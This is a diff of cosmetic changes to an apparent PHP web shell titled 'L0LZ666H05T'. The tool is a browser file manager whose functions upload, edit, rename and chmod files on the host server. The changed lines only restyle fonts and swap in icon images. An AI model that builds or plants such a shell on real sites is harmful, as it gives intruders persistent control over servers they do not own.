@@ -9,8 +9,9 @@
   <title>L0LZ666H05T</title>
 </head>
 <style type="text/css">
+@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
 body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  font-family: 'Ubuntu Mono', monospace;
   color: #fff;
   background:#000;
 }
@@ -62,7 +63,7 @@ td:last-child {
   padding-right: 10px;
 }
 textarea {
-   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  font-family: 'Ubuntu Mono', monospace;
   background:#383838;
   border:1px solid #383838;
   margin-left:-8px;
@@ -85,7 +86,7 @@ textarea::-webkit-scrollbar {
     background:#383838;
 }
 input[type=submit] {
-   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  font-family: 'Ubuntu Mono', monospace;
   padding:5px;
   outline:none;
   margin-left:-8px;
@@ -98,7 +99,7 @@ input[type=submit] {
   background:#383838;
 }
 input[type=text] {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  font-family: 'Ubuntu Mono', monospace;
   padding:5px;
   outline:none;
   margin-left:-8px;
@@ -111,7 +112,7 @@ input[type=text] {
   background:#383838;
 }
 select {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  font-family: 'Ubuntu Mono', monospace;
   margin-left:-8px;
   margin-right:10px;
   margin-top:10px;
@@ -169,7 +170,7 @@ table.back {
   border:none;
 }
 a.back {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  font-family: 'Ubuntu Mono', monospace;
   color:#fff;
   border-radius:3px;
   border:1px solid #383838;
@@ -309,7 +310,9 @@ function making($post) {
     ?>
     <thead>
       <tr>
-        <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">MAKE FILE & DIRECTORY</a></th>
+        <th>
+          <img src="https://image.flaticon.com/icons/svg/303/303804.svg" class="icon"> MAKE FILE & DIRECTORY
+        </th>
       </tr>
     </thead>
     <?php
@@ -378,6 +381,16 @@ function making($post) {
           <input style="width:100%;" type="submit" name="submit">
         </td>
       </tr>
+      <table class="back">
+      <tr>
+        <td>
+          <center>
+          <a class="back" href="?path=<?php print @cwd() ?>">
+            <img src="https://image.flaticon.com/icons/svg/364/364249.svg" class="icon">
+          </a>
+        </center>
+        </td>
+      </tr>
     </form>
     <?php
     exit();
@@ -429,7 +442,9 @@ function upload($post) {
     ?>
     <thead>
         <tr>
-          <th><a style="color:#fff;" href="?path=<?php print @cwd() ?>">UPLOAD FILE</a></th>
+          <th>
+            <img src="https://image.flaticon.com/icons/svg/324/324911.svg" class="icon"> UPLOAD FILE
+          </th>
         </tr>
       </thead>
     <form method="post" enctype="multipart/form-data">
@@ -449,6 +464,16 @@ function upload($post) {
           <input type="file" name="file">
           <input type="submit" name="submit">
           </center>
+        </td>
+      </tr>
+      <table class="back">
+      <tr>
+        <td>
+          <center>
+          <a class="back" href="?path=<?php print @cwd() ?>">
+            <img src="https://image.flaticon.com/icons/svg/364/364249.svg" class="icon">
+          </a>
+        </center>
         </td>
       </tr>
     </form>
@@ -481,7 +506,9 @@ function edit($post, $filename) {
     ?>
     <thead>
       <tr>
-        <th>EDIT</th>
+        <th>
+          <img src="https://image.flaticon.com/icons/svg/311/311153.svg" class="icon"> EDIT
+        </th>
       </tr>
       <tr>
         <th>Filename : <?php print @permission($filename, @basename($filename)) ?></th>
@@ -536,7 +563,9 @@ function renames($post, $filename) {
     ?>
     <thead>
       <tr>
-        <th>RENAME</th>
+        <th>
+          <img src="https://image.flaticon.com/icons/svg/364/364258.svg" class="icon"> RENAME
+        </th>
       </tr>
     </thead>
     <form method="post">
@@ -587,7 +616,9 @@ function chmods($post, $filename) {
     ?>
     <thead>
       <tr>
-        <th>CHANGE MODE</th>
+        <th>
+          <img src="https://image.flaticon.com/icons/svg/243/243341.svg" class="icon"> CHANGE MODE
+        </th>
       </tr>
     </thead>
     <form method="post">
@@ -674,7 +705,7 @@ foreach ($getPATH as $dir) {
   ?>
   <tr class="hover">
     <td> 
-      <img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon">
+      <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
       <a href="?path=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>"><?php print $dir ?></a>
     </td>
     <td>
@@ -754,7 +785,7 @@ foreach ($getPATH as $file) {
       echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
     } elseif ($ext == "md"){echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
   } else {
-    echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
+    echo 'https://image.flaticon.com/icons/svg/833/833524.svg';
   } print("' class='icon'></img>");
   if (strlen($file) > 25){
     $_file = substr($file, 0, 25)."...-.".$ext;                       
